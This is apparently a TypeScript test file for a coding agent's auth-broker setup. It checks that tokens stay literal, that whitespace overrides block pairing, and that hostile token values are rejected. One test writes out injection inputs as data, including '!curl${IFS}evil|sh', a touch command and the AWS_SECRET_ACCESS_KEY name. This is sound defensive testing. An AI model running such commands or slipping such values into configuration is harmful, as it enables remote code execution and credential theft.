import { afterEach, expect, test } from "bun:test";
import { existsSync, mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Settings } from "@oh-my-pi/pi-coding-agent";
import { resolveConfigValue } from "@oh-my-pi/pi-coding-agent/config/resolve-config-value";
import { brokerOverridesPresent, captureBroker, configureBroker } from "../src/broker";
import type { Connection } from "../src/types";

const roots: string[] = [], instances: Settings[] = [];
afterEach(async () => { for (const settings of instances.splice(0)) { await settings.flush(); settings.cancelPendingSaves(); } for (const root of roots.splice(0)) rmSync(root, { recursive: true, force: true }); });
async function fixture() {
  const root = mkdtempSync(join(tmpdir(), "omp-token-")); roots.push(root);
  const settings = await Settings.loadIsolated({ agentDir: root, cwd: root }); instances.push(settings);
  const connection: Connection = { version: 1, url: "https://sync.invalid", token: `omps_${"A".repeat(43)}`, device: { id: "device", name: "Device", profile: "personal" }, previousBroker: {} };
  return { root, settings, connection };
}

test("issued tokens remain literal through OMP's real config resolver even when an env alias exists", async () => {
  const f = await fixture();
  const previous = process.env[f.connection.token];
  try {
    process.env[f.connection.token] = "canary-secret-must-not-become-bearer";
    await configureBroker(f.settings, f.connection);
    const resolved = await resolveConfigValue(String(captureBroker(f.settings).token));
    expect(resolved).toBe(f.connection.token);
    expect(resolved).not.toBe("canary-secret-must-not-become-bearer");
  } finally { if (previous === undefined) delete process.env[f.connection.token]; else process.env[f.connection.token] = previous; }
}, 15_000);

test("untrusted command and environment-name tokens cannot alter broker configuration", async () => {
  const f = await fixture(); const marker = join(f.root, "executed");
  const before = captureBroker(f.settings);
  for (const token of [`!touch ${marker}`, "!curl${IFS}evil|sh", "AWS_SECRET_ACCESS_KEY", `omps_${"A".repeat(42)}'`, `omps_${"A".repeat(42)}$`]) {
    await expect(configureBroker(f.settings, { ...f.connection, token })).rejects.toThrow();
    expect(captureBroker(f.settings)).toEqual(before);
  }
  expect(existsSync(marker)).toBe(false);
});

test("whitespace broker overrides block pairing just as OMP's resolver does", async () => {
  const f = await fixture();
  for (const key of ["OMP_AUTH_BROKER_URL", "OMP_AUTH_BROKER_TOKEN"] as const) {
    const previous = process.env[key];
    try {
      process.env[key] = " ";
      expect(brokerOverridesPresent()).toBe(true);
      await expect(configureBroker(f.settings, f.connection)).rejects.toThrow();
      expect(captureBroker(f.settings)).toEqual({});
    } finally { if (previous === undefined) delete process.env[key]; else process.env[key] = previous; }
  }
});
